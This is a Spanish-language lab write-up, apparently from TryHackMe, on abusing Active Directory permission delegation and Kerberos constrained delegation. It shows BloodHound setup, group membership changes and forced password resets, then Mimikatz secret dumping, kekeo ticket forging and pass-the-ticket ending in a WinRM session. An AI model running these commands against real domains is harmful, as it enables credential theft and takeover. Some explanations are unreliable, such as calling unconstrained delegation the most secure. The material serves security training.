# Explotar AD

# Objetivos de aprendizaje

- Delegación AD
- Forzar reglas de autentificación
- GPO
- Usuarios de AD como targets
- Confianzas de dominios
- Tickets de plata y oro

# Explotar delegación de permisos

AD puede delegar permisos y privilegios con una herramienta llamada "delegación de permisos" (no confundamos con la delegacoón de Kerberos)

Esto es muy importante. Imagina que tienes 5000 empleados y te preocupa la seguridad, hay 3 usuarios con credencailes de mierda. Es posible que esos 3 usuarios le manden consultas, para resetear la contraseña. Usando Delegacion podemos forzar a cambiar dicha contraseña.

## Delegación de permisos

El exploit de delgación de permisos se refiere a ataques ACK. El administrador configura un acceso de control ACEs en la pulares ACLS.

Sin embargo, estas ACLS pueden estar mal configurados, dando un ataque posible. Como ejemplo. Imagina el equipo de IT tene la ACL de Cambiar la contraseña al grupo de dominio, esto se considera inseguro. Ya que los mismos usuarios estan permitidos para cambiar contraseña.

## EXplotar ACEs

- Cambiar contraseñas
- Añadir miembros
- GenericALL
- GenericWrite
- WriteOwener
- WriteDACL
- AllextendedRights

# Bloodhound

```
thm@thm:~# neo4j console start
Active database: graph.db
Directories in use:
  home:         /var/lib/neo4j
  config:       /etc/neo4j
  logs:         /var/log/neo4j
  plugins:      /var/lib/neo4j/plugins
  import:       /var/lib/neo4j/import
  data:         /var/lib/neo4j/data
  certificates: /var/lib/neo4j/certificates
  run:          /var/run/neo4j
Starting Neo4j.
[....]
2022-03-13 19:59:18.014+0000 INFO  Bolt enabled on 127.0.0.1:7687.
```
En otro terminar pues abrimos dicho programa
```
bloodhoun --no-sandbox
```

neo4j:neo4j

## Escala de privilegios

![image](https://github.com/user-attachments/assets/2d9432e2-d092-44be-a9e7-8acd21e48299)

![image](https://github.com/user-attachments/assets/aa276db4-8e5d-436b-b269-69e2aec13441)

Vemos una ruta muy interesante. Tenemos una delegación de permisos en este dominio. EL administrador ha dado el permiso AddMembers a "Users Groups" los miembros de este grupo tienen dicho permiso, tambien vemos que el grupo de IT tiene el cambiar de contraseñas. Esto no es una mala configuración porque tiene sentido

## Añadir Miembros

EL primer paso de la ruta de la cuenta de AD en el grupo de IT. Podemos ver los grrupos que tienen dicho permiso

```
PS C:\>Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
```

Podemos verificar el comando usando el Get-ADGroupMember

```
PS C:\>Get-ADGroupMember -Identity "IT Support"
distinguishedName : CN=hugh.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
name              : hugh.jones
objectClass       : user
objectGUID        : 460178d3-c818-4e28-9a39-b1ab2b0d3779
SamAccountName    : hugh.jones
SID               : S-1-5-21-3885271727-2693558621-2658995185-1113
```

## Forzar cambiar contraseña

Ahora que somos miembros del grupo de IT, podemos delegar este tipo de permiso

```
PS C:\>Get-ADGroupMember -Identity "Tier 2 Admins"
distinguishedName : CN=t2_lawrence.lewis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_lawrence.lewis
objectClass       : user
objectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828
SamAccountName    : t2_lawrence.lewis
SID               : S-1-5-21-3885271727-2693558621-2658995185-1893

[....]

distinguishedName : CN=t2_leon.francis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_leon.francis
objectClass       : user
objectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9
SamAccountName    : t2_leon.francis
SID               : S-1-5-21-3885271727-2693558621-2658995185-3660
```

Ahora que tenemos los usuarios y sus cuentas. podemos forzar el cambio de contraseña

```
PS C:\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
PS C:\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
```

Para actualizar dichas directivas

```
gpudate /force
```

# Explotar Delegación Kerberos

Kerberos esta activada para acceder a los recursos hosteador en un servidor diferente. Por ejemplo tenemos acceso a la base de datos hosteada. Sin la delegación, probablemente el servicio de AD de las cuentas de acceso directo a la base de datos. CUando se hace una consulta, el servicio autentifica a la base de datos y devuelve la información

Sin embargo, si estas en una cuenta que tenga dicha delegación de servicio de SQL. No sera necesario logearse en la aplicacion web sel servicio. 

## Restricciones y no restricciones

Hay dos tipos de delegación en Kerberos, la implementación original, es la delegación sin restricción, el metodo mas seguro. En esencia, no limita la delegación y por detras el usuario tiene una delegación asegurada, las autentificaciónes del host sin la restricción se pueden configurar, como un ticket TGT para la cuenta y se genra en la memoria hasta que se necesite

Si un atacante quiere comprometer con no restrictivo, en este caso habria que forzar privilegios de la cuenta, e interceptar dicho ticket TGT

En restricción usualmente es mucho mas fácil simplemente podemos hacer lo que queramos. Podemos genertar TGT para la cuenta, podemos ejecutar, etc.

## Restricción basada en delegaciones

Aquí tenemos 3 tipos. Para que entendamos esto es una restriccion adicional de la seguridad de Kerberos. Cambia el modelo entero de delegacion. Esspecificando cada objeto que hay que delegar, este serivcio nos da el control de todos los accesos. 

# Delegación Restrictiva explotación

Primero de todo deberemos enumerar las delegaciones activas. Vamos a usar nuestros nuevos privilegios.

```
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```

Con este comando delegamos que la cuenta svcllS delegue los HTTP y SWMAN servicio a THMSERVER

Utilizaremos Mimikatz para dumpear los secretos 

```
C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM


mimikatz # lsadump::secrets
Domain : THMWRK1
SysKey : redacted

Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 )
Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )
Domain FQDN : za.tryhackme.loc

Policy subsystem is : 1.18
LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}
  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463

Secret  : $MACHINE.ACC
cur/text: redacted
    NTLM:redacted
    SHA1:redacted
old/text: redacted
    NTLM:redacted
    SHA1:redacted

Secret  : DefaultPassword
cur/text: redacted
old/text: redacted

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
cur/text: redacted

mimikatz #
```

Una vez tengamos la password, podemos hacer una ataque de delgación combinando "kekeo" y "mimikatz" token:elevate 

```
PS C:\> C:\Tools\kekeo\x64\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [4/30/2022 1:29:00 PM ; 4/30/2022 11:29:00 PM] {R:5/7/2022 1:29:00 PM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 548e500d4ee2f5c61710254ea9dd43e2ce0123026d329c97e512695e2f1777a7
  [s4u2self] t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 172.31.1.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */
```

Deberemos generar un ticket TGT para HTTP y WSMAN servicios

```

kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted
Realm        : za.tryhackme.loc (za)
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 172.31.1.101 (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```

Ahora que tenemos un TGT para la cuenta, podemos forzar consultas TGT que queremos.

```
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [4/30/2022 1:29:00 PM ; 4/30/2022 11:29:00 PM] {R:5/7/2022 1:29:00 PM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 548e500d4ee2f5c61710254ea9dd43e2ce0123026d329c97e512695e2f1777a7
  [s4u2self] t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 172.31.1.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'
```

Ejecutando el comando otra vez, esta vez el servicio WSMAN


```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK
```
Ya podemos salirnos de klist y si queremos virificar los tickets.

```
mimikatz # exit
Bye!
PS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available


PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> whoami
za\t1_trevor.jones
```



